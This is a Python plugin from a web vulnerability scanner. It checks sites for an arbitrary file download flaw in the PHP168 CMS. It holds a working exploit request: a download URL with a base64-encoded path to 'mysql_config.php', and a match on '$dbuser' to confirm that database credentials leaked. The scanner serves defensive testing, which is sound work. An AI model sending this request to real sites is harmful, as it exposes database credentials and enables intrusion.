#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    result = []
    try:
        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        inj_path_list = [
            # url的值是文件名 'php168/mysql_config.php' + ' ' 然后做base64编码转换
            """/do/job.php?job=download&url=cGhwMTY4L215c3FsX2NvbmZpZy5waHAg"""
        ]

        for inj_path in inj_path_list:
            new_url = "%s://%s%s" % (scheme, domain, inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.get('status') == '200' and re.search(r'\$dbuser', content):
                detail = "检测到PHP168任意文件下载漏洞"
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res, content, '\$dbuser')
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:PHP168DownLoadScript_yd.py, run_domain function :%s" % (str(e)))

    return result



